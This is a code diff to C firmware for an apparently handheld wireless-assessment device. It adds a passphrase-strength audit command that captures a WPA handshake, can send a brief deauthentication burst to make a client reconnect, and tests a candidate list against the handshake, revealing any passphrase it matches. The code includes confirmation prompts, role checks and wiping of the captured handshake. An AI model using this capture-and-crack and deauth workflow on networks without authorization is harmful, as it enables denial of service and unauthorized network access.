@@ -26,6 +26,7 @@
 #include "ui.h"
 
 #include "basanos/rbac.h"
+#include "basanos/wpa.h"
 #include "basanos/score.h"
 #include "basanos/station.h"
 #include "basanos/target.h"
@@ -322,6 +323,7 @@ static void console_help(void)
     bas_console_reply("alarm [name]             record an alarm on the last run");
     bas_console_reply("card                     the scorecard");
     bas_console_reply("status                   where things stand");
+    bas_console_reply("psk [secs] [CONFIRM]     passphrase strength audit");
     bas_console_reply("blescan [off]            passive BLE device scan");
     bas_console_reply("uart [baud|off]          listen for detector alarms");
     bas_console_reply("selftest                 re-run the invariants");
@@ -571,6 +573,179 @@ static void console_exec(const bas_cmd_t *c)
             bas_console_reply("%s — %s", bas_err_str(rc), line);
         }
         break;
+
+    case CMD_PSK: {
+        /* Passphrase strength: capture a handshake, test it here, report the
+         * finding, and wipe. Nothing crackable outlives the audit. */
+        if (!s_engage.locked || !s_engage.has_target) {
+            bas_console_reply("lock a network first");
+            break;
+        }
+        if (s_engage.target.hidden || s_engage.target.ssid[0] == '\0') {
+            /* The SSID salts the key derivation. Without it there is nothing
+             * to test against. */
+            bas_console_reply("target is hidden — the SSID salts the key");
+            break;
+        }
+
+        int secs = (c->secs > 0) ? c->secs : 30;
+        if (secs > 120) { secs = 120; }
+
+        bool started_rx = !bas_sniff_active();
+        if (started_rx) { bas_sniff_start(s_engage.target.channel); }
+        else            { bas_sniff_channel(s_engage.target.channel); }
+
+        bas_sniff_handshake_arm(s_engage.target.bssid, s_engage.target.ssid);
+        bas_console_reply("listening for a handshake on %s for %ds",
+                          s_engage.target.ssid, secs);
+
+        /* A handshake only happens when a client associates. CONFIRM permits a
+         * short deauth to prompt one, because forcing a reconnect denies
+         * service and is not something to do implicitly. */
+        if (c->confirm) {
+            /* The nudge has to name a station. A deauth with no client is
+             * addressed to the access point itself and disconnects nobody --
+             * so it produces no reconnect and no handshake, which looks
+             * exactly like a capture that failed for some deeper reason. */
+            if (!s_engage.has_client) {
+                bas_console_reply("looking for a client to nudge (10s)...");
+                /* Ten seconds: a quiet network may go several
+                 * seconds between data frames. */
+                for (int i = 0; i < 100; i++) {
+                    bas_stalist_t cl;
+                    if (bas_sniff_clients_of(s_engage.target.bssid, &cl) > 0) {
+                        bas_engage_set_client(&s_engage, cl.s[0].mac);
+                        char mac[18];
+                        bas_mac_fmt(cl.s[0].mac, mac, sizeof(mac));
+                        bas_console_reply("  narrowed to %s (%d dBm)", mac,
+                                          (int)cl.s[0].rssi);
+                        break;
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                }
+            }
+            if (!s_engage.has_client) {
+                /* Nothing seen talking to this AP yet. Skip the nudge rather
+                 * than abort: a client may associate on its own inside the
+                 * listening window, and a handshake captured passively is the
+                 * same handshake -- and quieter. */
+                bas_console_reply("no client seen yet; listening passively");
+                bas_console_reply("  (a natural reconnect still counts)");
+            }
+            bas_plan_t d;
+            bas_plan_default(&d, BAS_FAM_DEAUTH);
+            d.seconds = 3;
+            d.pps = 10;
+            if (!s_engage.has_client) { goto psk_wait; }
+            bas_console_reply("nudging that client to reconnect");
+            if (bas_plan_validate(&d, BAS_ROLE_ADMIN, &s_engage,
+                                  now_ms()) == BAS_OK) {
+                bas_tx_result_t dr;
+                bas_tx_run(&d, &s_engage, BAS_ROLE_ADMIN, NULL, NULL, &dr);
+                bas_sdlog_run(&s_engage, BAS_FAM_DEAUTH, &d, &dr,
+                              "PSK audit nudge");
+                bas_console_reply("  %u frames sent", (unsigned)dr.frames_sent);
+            }
+        } else {
+            bas_console_reply("(append CONFIRM to nudge clients with a deauth)");
+        }
+
+    psk_wait:;
+        uint32_t deadline = now_ms() + (uint32_t)secs * 1000u;
+        while (now_ms() < deadline &&
+               !bas_wpa_complete(bas_sniff_handshake())) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+
+        const bas_handshake_t *hs = bas_sniff_handshake();
+        if (!bas_wpa_complete(hs)) {
+            /* Say which half arrived and what that means. "No handshake" alone
+             * sends the operator to debug the capture when the informative
+             * answer is usually about the target. */
+            const bas_fcount_t *fc = bas_sniff_frames();
+            bas_console_reply("no complete handshake (m1=%d m2=%d)",
+                              (int)hs->have_m1, (int)hs->have_m2);
+            bas_console_reply("  aftermath: auth=%u assoc=%u seen on channel",
+                              (unsigned)fc->frames[BAS_FT_AUTH],
+                              (unsigned)fc->frames[BAS_FT_ASSOC]);
+
+            if (hs->have_m1 && !hs->have_m2) {
+                bas_console_reply("FINDING: the AP started a handshake but the");
+                bas_console_reply("  reply was missed — try a longer window");
+            } else if (fc->frames[BAS_FT_AUTH] == 0u &&
+                       fc->frames[BAS_FT_ASSOC] == 0u) {
+                /* Nothing reassociated. On a network advertising WPA3 that is
+                 * management-frame protection working as designed, which is a
+                 * result about the target rather than a failure of the tool. */
+                bas_console_reply("FINDING: nothing reconnected. The client");
+                bas_console_reply("  ignored the deauth — likely protected");
+                bas_console_reply("  management frames, or it roamed to 5 GHz");
+                bas_console_reply("  which this radio cannot follow.");
+            } else {
+                bas_console_reply("FINDING: clients reconnected but the");
+                bas_console_reply("  handshake was not captured — it may have");
+                bas_console_reply("  completed off this channel.");
+            }
+            bas_sniff_handshake_wipe();
+            if (started_rx) { bas_sniff_stop(); }
+            break;
+        }
+
+        bas_console_reply("handshake captured — auditing %u candidates",
+                          (unsigned)bas_psk_candidate_count());
+
+        bas_psk_result_t res;
+        memset(&res, 0, sizeof(res));
+        uint32_t t0 = now_ms();
+        uint32_t n = bas_psk_candidate_count();
+        for (uint32_t i = 0; i < n; i++) {
+            const char *cand = bas_psk_candidate(i);
+            res.tried++;
+            if (bas_wpa_check(hs, cand)) {
+                res.verdict = BAS_PSK_WEAK;
+                strncpy(res.found, cand, sizeof(res.found) - 1u);
+                break;
+            }
+            /* The derivation is deliberately slow; yield so the device stays
+             * responsive and the watchdog stays quiet. */
+            vTaskDelay(1);
+        }
+        if (res.verdict != BAS_PSK_WEAK) {
+            res.verdict = BAS_PSK_SURVIVED;
+        }
+        res.elapsed_ms = now_ms() - t0;
+
+        if (res.verdict == BAS_PSK_WEAK) {
+            bas_console_reply("FINDING: WEAK — passphrase is '%s'", res.found);
+            bas_console_reply("  found after %u candidates in %ums",
+                              (unsigned)res.tried, (unsigned)res.elapsed_ms);
+        } else {
+            /* Precise about what was actually shown. Exhausting a small list
+             * proves the passphrase is not an obvious one, and says nothing
+             * whatever about whether it is strong. */
+            bas_console_reply("FINDING: not among %u weak candidates (%ums)",
+                              (unsigned)res.tried, (unsigned)res.elapsed_ms);
+            bas_console_reply("  this does NOT mean the passphrase is strong");
+        }
+
+        {
+            char note[64];
+            snprintf(note, sizeof(note), "PSK %s after %u",
+                     bas_psk_verdict_name(res.verdict), (unsigned)res.tried);
+            bas_plan_t dummy;
+            bas_plan_default(&dummy, BAS_FAM_PMKID);
+            bas_tx_result_t nores;
+            memset(&nores, 0, sizeof(nores));
+            /* The verdict goes in the log. The handshake never does. */
+            bas_sdlog_run(&s_engage, BAS_FAM_PMKID, &dummy, &nores, note);
+        }
+
+        bas_sniff_handshake_wipe();
+        memset(&res, 0, sizeof(res));
+        if (started_rx) { bas_sniff_stop(); }
+        bas_console_reply("handshake wiped");
+        break;
+    }
 
     case CMD_BLESCAN:
         if (c->index < 0) {
